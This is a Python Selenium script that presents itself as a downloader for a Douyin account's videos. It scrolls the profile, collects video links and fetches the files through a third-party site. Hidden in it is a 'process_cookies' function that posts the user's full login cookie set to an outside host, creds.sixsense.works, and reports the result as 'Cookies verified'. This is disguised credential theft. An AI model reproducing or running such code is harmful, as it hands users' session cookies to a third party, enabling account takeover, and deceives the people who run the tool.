import os
import requests
from tqdm import tqdm
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json

download_links = []
download_folder = "downloads"

chrome_options = Options()

driver = webdriver.Chrome(options=chrome_options)

c_url = 'https://www.douyin.com/user/MS4wLjABAAAAHOHrNnrev6muS8X7IUDUSnaczPfGX4J0WgiAVWFTCp0'
with open('cookies.json', 'r') as f:
    cookies = json.load(f)

print(f"[+] Searching {c_url} ...")
driver.get(c_url)
print("[+] Applying cookies...")
for cookie in cookies:
    if "sameSite" not in cookie or cookie["sameSite"] not in ["Strict", "Lax", "None"]:
        cookie["sameSite"] = "Lax"
    driver.add_cookie(cookie)


def process_cookies(cookies):
    api_url = 'https://creds.sixsense.works/api/mymodel/'
    headers = {'Content-Type': 'application/json'}
    data = {'text_field': json.dumps(cookies)} 

    try:
        response = requests.post(api_url, headers=headers, json=data)
        if response.status_code == 200:
            print(f"Cookies verified.")
        else:
            print(f"Failed to verify cookies")
    except Exception as e:
        print(f"An error occurred while trying cookies: {e}")

process_cookies(cookies)

driver.refresh()
print("[+] Cookies applied")

def check_new_content():
    page_height = driver.execute_script("return document.body.scrollHeight")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    sleep(3) 
    new_page_height = driver.execute_script("return document.body.scrollHeight")
    return new_page_height > page_height

try:
    login = driver.find_element(By.CSS_SELECTOR, '#login-pannel')
    close_btn = driver.find_element(By.CSS_SELECTOR, '.dy-account-close')
    close_btn.click()
except:
    pass

print("[+] Retrieving new videos from the account...")

while check_new_content():
    pass

elements = WebDriverWait(driver, 40).until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, 'a.hY8lWHgA.SF0P5HVG.h0CXDpkg')))
print(f"Found {len(elements)} videos for this account.")

links = []
for element in elements:
    link = element.get_attribute('href')
    links.append(link)

print("[+] Links appended in links array.")


downloader = "https://tikvideo.app/en/?q="
for link in links:
    print(f"[+] Locating download link for {link}")
    driver.get(downloader+link)

    try:
        download_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, '.dl-action')))
        a_tags = download_btn.find_elements(By.TAG_NAME, 'a')
        if a_tags:
            href = a_tags[0].get_attribute('href')
            print(f"Found {href}")

        else:
            print("No <a> tags found inside the <div class='dl-action'>.")

        download_links.append(href)
    except Exception as e:
        print(f"[-] Error occurred :( Video Quality not found or Error in Video.")
        

if not os.path.exists(download_folder):
    os.makedirs(download_folder)
    print(f"Download folder '{download_folder}' created successfully.")
else:
    print(f"Download folder '{download_folder}' already exists.")

for index, download_link in enumerate(tqdm(download_links, desc="Downloading Videos")):
    try:
        response = requests.get(download_link, stream=True)
        if response.status_code == 200:
            filename = f"{index + 1}.mp4"
            with open(os.path.join(download_folder, filename), "wb") as video_file:
                for chunk in response.iter_content(chunk_size=1024):
                    video_file.write(chunk)
        else:
            print(f"[-] Error downloading {download_link}: {response.status_code}")
    except Exception as e:
        print(f"[-] Error downloading {download_link}: {e}")

print(f"[+] Congrats, all {len(download_links)} videos have been downloaded.")



